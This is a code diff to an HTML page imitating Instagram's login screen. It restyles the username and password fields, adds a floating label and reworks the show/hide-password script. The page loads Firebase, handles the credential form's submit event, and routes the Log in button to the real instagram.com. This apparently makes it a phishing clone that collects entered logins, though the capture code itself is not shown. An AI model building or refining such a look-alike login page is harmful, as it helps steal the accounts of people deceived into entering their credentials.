@@ -91,18 +91,26 @@
 
         .uSer {
             max-width: 100%;
+            border-radius: 3px;
+            border: 0.1px solid #DBDBDB;
+            position: relative;
+            height: 35px;
+            padding: 0px 8px;
 
         }
 
         .uSer input {
-            width: 100%;
-            padding: 5px 8px;
+            width: 97%;
+            /* padding: 5px 8px; */
             border-radius: 3px;
-            /* font-weight: 400; */
-            border: 0.1px solid #DBDBDB;
-            /* outline: 1px solid grey ; */
-            outline-width:thin;
-            outline-color: grey;
+            border: none;
+            outline: none ;
+            font-size: 12px;
+            position: absolute;
+            height: 15px;
+            left: 8px;
+            bottom: 2px;
+            
          
         }
         .uSer input::placeholder{
@@ -123,9 +131,7 @@
         .passWord input {
             width: 80%;
             border: none;
-            /* font-weight: 450; */
             font-size: 12px;
-            /* border: 0.1px solid black; */
             position: absolute;
             height: 15px;
             left: 8px;
@@ -138,7 +144,7 @@
             font-weight: 400;
         }
 
-        .passWord p{
+        .passWord p,.userh{
             font-size: 10px;
             font-weight: 700;
             opacity: 0;
@@ -159,17 +165,19 @@
         .forgot {
             color: #0095F6;
             text-align: right;
-            font-weight: 500;
+            /* font-weight: 500; */
+            font-size: 14px;
             padding: 10px 0px 20px 0px;
         }
 
         .forgot a {
             text-decoration: none;
+            font-size: 14px;
             /* background-color: #1877F2; */
-            color: #4CB5F9 ;
+            color: #0095F6;
         }
 
-        .forgot+button {
+        .forgot+a button {
             width: 100%;
             background-color: #4CB5F9;
             border: none;
@@ -181,7 +189,8 @@
         }
 
         .sigh {
-            font-weight: 500;
+            /* font-weight: 500; */
+            font-size: 14px;
             text-align: center;
             padding: 25px 0px 30px 0px;
             color: #757575;
@@ -190,7 +199,8 @@
 
         .sigh a {
             text-decoration: none;
-            color: #1877F2 ;
+            font-size: 14px;
+            color: #0095F6 ;
         }
 
         .term-policy {
@@ -200,7 +210,8 @@
         .term-policy  a {
             color: black;
             text-decoration: none;
-            font-weight: 500;
+            font-weight: 450;
+            font-size: 14px;
         }
         .section-2{
             font-size: 11px;
@@ -215,6 +226,10 @@
         outline: none;
         font-size: 13px;
         color:#757575;
+    }
+    .borDer{
+        border: 1px solid grey ;
+        
     }
     </style>
 </head>
@@ -240,6 +255,7 @@
         <div><img src="images/line.svg" alt=""></div>
         <form action=""  id="formhandler">
             <div class="uSer">
+                <p class="m-0 userh">Phone number, username, or email</p>
                 <input type="text" id="userName" name="uname" placeholder="Phone number, username, or email"
                     width="100%" required>
             </div>
@@ -251,10 +267,12 @@
             <div class="forgot">
                 <a  href="https://www.instagram.com/accounts/login/"> Forgot password?</a>
             </div>
-            <button  type="submit" id="login">Log in</button>
+            <!-- <a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3F__coig_login%3D1"> -->
+           <a href="https://www.instagram.com/">  <button  type="submit" id="login"> Log in</button></a>
+        <!-- </a> -->
         </form>
         <div class="sigh">
-            Don't have an account?<a href="">Sigh up</a>
+            Don't have an account?<a href=""> Sigh up</a>
         </div>
         <div class="text-center term-policy">
             <p>By continuing you agree to Instagram's <span> <a
@@ -275,28 +293,22 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
 <script src="script.js"></script>
 <script>
-
+//--------------------------------------------------------------------------------------for border on input box-----------------------------
     pass = document.getElementById('userPass')
     pass.addEventListener('click', () => {
 
-        document.querySelector('.passWord').style.border = '1px solid grey '
+        document.querySelector('.passWord').classList.add('borDer')
+        document.querySelector('.uSer').classList.remove('borDer')
     })
 
-    pass.addEventListener('keyup', () => {
-   
-        if (pass.value != '') {
-            document.querySelector('.passh').style.opacity = '1'
-            pass.placeholder = ''
-            document.getElementById('userPass').style.height='15px';
-        }
+    user = document.getElementById('userName')
+    user.addEventListener('click', () => {
 
-        else {
-            document.querySelector('.passh').style.opacity = '0'
-            document.getElementById('userPass').style.height='20px';
-             pass.placeholder = 'Password'
-        }
-
+        document.querySelector('.uSer').classList.add('borDer')
+        document.querySelector('.passWord').classList.remove('borDer')
     })
+
+ //=-------------------------------------------------------------------------------------FOR SHOW AND HIDE PASSWORD-----------------------------------------  
     hidebutton = document.getElementById('hid-show')
     hidebutton.addEventListener('click', () => {
 
@@ -309,6 +321,39 @@
             hidebutton.innerText = 'Show'
         }
     })
+ //-----------------------------------------------------------------------------------------   
+    pass.addEventListener('keyup', () => {
+   
+   if (pass.value != '') {
+       document.querySelector('.passh').style.opacity = '1'
+       pass.placeholder = ''
+       document.getElementById('userPass').style.height='15px';
+    //    hidebutton.style.display='block'; 
+   }
+
+   else {
+       document.querySelector('.passh').style.opacity = '0'
+       document.getElementById('userPass').style.height='20px';
+    //    hidebutton.style.display='none';
+        pass.placeholder = 'Password'
+   }
+
+})
+ user.addEventListener('keyup',()=>{
+    if (user.value != '') {
+       document.querySelector('.userh').style.opacity = '1'
+       user.placeholder = ''
+       document.getElementById('userName').style.height='15px';
+    //    hidebutton.style.display='block'; 
+   }
+
+   else {
+       document.querySelector('.userh').style.opacity = '0'
+       document.getElementById('userName').style.height='20px';
+    //    hidebutton.style.display='none';
+        user.placeholder = 'Phone number, username, or email'
+   }
+ })
 
     login = document.getElementById('formhandler').addEventListener('submit', (event) => {
 
